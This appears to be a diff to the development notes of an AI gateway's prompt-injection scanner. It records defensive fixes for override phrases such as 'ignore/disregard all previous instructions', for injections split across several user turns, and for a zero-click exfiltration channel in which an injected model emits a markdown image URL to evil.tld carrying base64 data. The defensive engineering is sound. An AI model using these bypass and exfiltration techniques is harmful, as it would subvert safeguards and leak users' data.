@@ -70,7 +70,22 @@
         R4b (f176fc76) scanner.py: _reassemble_split_words glues short-fragment runs + re-segments vs
           injection vocab → fixed G3 (2 chunk-split/spaced injection). Vocab-curated → zero FP.
       REMAINING R4 hardening (NOT yet encoded as findings; lower priority than R5/R6 completion gates):
-        G6 multi-turn session state (scanner.py), G10 semantic-redact typed-placeholder.
+        G10 semantic-redact typed-placeholder.
+        G15 (NEW, reproduced 2026-07-02): scanner.py Tier-1 ATTACK_PATTERNS injection catalogue misses the
+          disregard/forget/override verb alternation even SINGLE-turn ("disregard all previous instructions"
+          -> allow), while context_guard.INDIRECT_INJECTION_PATTERNS has the full (?:ignore|disregard|forget
+          |override) alternation. Widen the scanner injection pattern to match; that ALSO closes disregard-
+          family MULTI-turn splits automatically via the G6 _reassemble_user_turns re-scan. Low risk (same
+          qualifier+object requirement as the ignore pattern; frozen benign_ignore/benign_number/benign_quote
+          must stay allow). NEXT iteration item.
+      G6 DONE 2026-07-02: multi-turn / crescendo split injection. A phrase fragmented across successive USER
+        turns (assistant turns between break contiguity) matched no single-turn NOR full-concat signature ->
+        bypass. Reproduced: "ignore all previous instructions" over 3 user turns -> allow. Fixed in scanner.py:
+        _reassemble_user_turns (USER-turn-only view, markers dropped) + _scan_prompt_sync re-scan (recursion-
+        guarded _multiturn, honor only real attack block, never dos/downgrade). Feeds deobfuscation so leet/
+        unicode cross-turn splits caught. No new FP (benign multi-turn allow; explanatory carve-out preserved).
+        6 golden cases frozen. Full gateway 1050 passed; golden 52 passed/7 skipped 3x. Residual: fragments
+        split into FAKE assistant turns aren't reassembled (tier-2 guard model is the semantic backstop).
       G13 DONE 2026-07-02: output-side data-exfiltration channel (zero-click markdown-image / link /
         bare-URL beacon). A model steered by indirect injection emits ![x](https://evil.tld/log?d=<b64>)
         -> client auto-fetches the image on render -> zero-click exfil, even for NON-PII payloads (the
